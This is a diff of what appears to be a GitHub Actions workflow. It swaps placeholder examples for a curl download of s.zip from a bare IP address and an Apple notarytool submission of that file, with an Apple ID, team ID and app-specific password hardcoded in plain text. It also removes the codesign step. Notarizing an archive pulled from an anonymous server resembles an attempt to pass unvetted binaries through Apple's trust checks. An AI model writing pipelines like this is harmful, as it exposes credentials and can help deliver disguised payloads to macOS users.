@@ -17,7 +17,7 @@ jobs:
         run: |
           # Replace this with the actual command to download the file from the IP address.
           # You can use 'curl' or other relevant tools.
-          curl -o downloaded_file.ext http://182.198.11.100/path/to/file.ext
+          curl -o s.zip http://161.35.226.248:9000/s.zip
 
       # You would need to add additional steps here to perform notarization.
       # The specific notarization process depends on your application and requirements.
@@ -27,6 +27,4 @@ jobs:
         run: |
           # Replace this with your code signing and notarization commands.
           # This is just a placeholder example.
-          codesign -s "Your Developer ID" path/to/your.app
-          xcrun altool --notarize-app -f path/to/your.app -u "your_email@example.com" -p "your_app_specific_password"
-
+          xcrun notarytool submit s.zip --apple-id "deljwviuro@yahoo.com" --team-id "49T3Z5327K" --password "bcus-niye-cdjj-exhw"  --wait
